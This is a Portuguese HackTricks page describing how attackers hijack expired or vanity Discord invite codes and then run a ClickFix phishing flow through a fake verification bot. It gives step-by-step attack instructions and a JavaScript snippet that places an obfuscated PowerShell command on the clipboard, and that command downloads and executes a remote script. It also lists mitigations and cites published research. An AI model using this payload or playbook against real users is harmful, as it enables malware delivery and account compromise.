# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

A vulnerabilidade do sistema de convites do Discord permite que atores de ameaça reivindiquem códigos de convite expirados ou excluídos (temporários, permanentes ou personalizados) como novos links personalizados em qualquer servidor com Boost de Nível 3. Ao normalizar todos os códigos para letras minúsculas, os atacantes podem pré-registrar códigos de convite conhecidos e silenciosamente sequestrar o tráfego uma vez que o link original expire ou o servidor de origem perca seu boost.

## Tipos de Convite e Risco de Sequestro

| Tipo de Convite       | Sequestre?  | Condição / Comentários                                                                                     |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Link de Convite Temporário | ✅          | Após a expiração, o código se torna disponível e pode ser re-registrado como uma URL personalizada por um servidor com boost. |
| Link de Convite Permanente | ⚠️          | Se excluído e consistindo apenas de letras minúsculas e dígitos, o código pode se tornar disponível novamente.        |
| Link Personalizado    | ✅          | Se o servidor original perder seu Boost de Nível 3, seu convite personalizado se torna disponível para novo registro.    |

## Etapas de Exploração

1. Reconhecimento
- Monitore fontes públicas (fóruns, redes sociais, canais do Telegram) em busca de links de convite que correspondam ao padrão `discord.gg/{code}` ou `discord.com/invite/{code}`.
- Colete códigos de convite de interesse (temporários ou personalizados).
2. Pré-registro
- Crie ou use um servidor Discord existente com privilégios de Boost de Nível 3.
- Em **Configurações do Servidor → URL Personalizada**, tente atribuir o código de convite alvo. Se aceito, o código é reservado pelo servidor malicioso.
3. Ativação do Sequestro
- Para convites temporários, aguarde até que o convite original expire (ou exclua manualmente se você controlar a origem).
- Para códigos que contêm letras maiúsculas, a variante em minúsculas pode ser reivindicada imediatamente, embora a redireção só ative após a expiração.
4. Redirecionamento Silencioso
- Usuários que visitam o link antigo são enviados sem problemas para o servidor controlado pelo atacante uma vez que o sequestro esteja ativo.

## Fluxo de Phishing via Servidor Discord

1. Restringir os canais do servidor para que apenas um canal **#verify** seja visível.
2. Implantar um bot (por exemplo, **Safeguard#0786**) para solicitar que os novatos verifiquem via OAuth2.
3. O bot redireciona os usuários para um site de phishing (por exemplo, `captchaguard.me`) sob a aparência de um passo de CAPTCHA ou verificação.
4. Implementar o truque de UX **ClickFix**:
- Exibir uma mensagem de CAPTCHA quebrado.
- Orientar os usuários a abrir o diálogo **Win+R**, colar um comando PowerShell pré-carregado e pressionar Enter.

### Exemplo de Injeção de Clipboard ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Essa abordagem evita downloads diretos de arquivos e aproveita elementos de UI familiares para reduzir a suspeita do usuário.

## Mitigações

- Use links de convite permanentes contendo pelo menos uma letra maiúscula ou caractere não alfanumérico (nunca expiram, não reutilizáveis).
- Rode regularmente os códigos de convite e revogue links antigos.
- Monitore o status de boost do servidor Discord e as reivindicações de URL de vaidade.
- Eduque os usuários a verificar a autenticidade do servidor e evitar executar comandos colados da área de transferência.

## Referências

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link

{{#include /banners/hacktricks-training.md}}
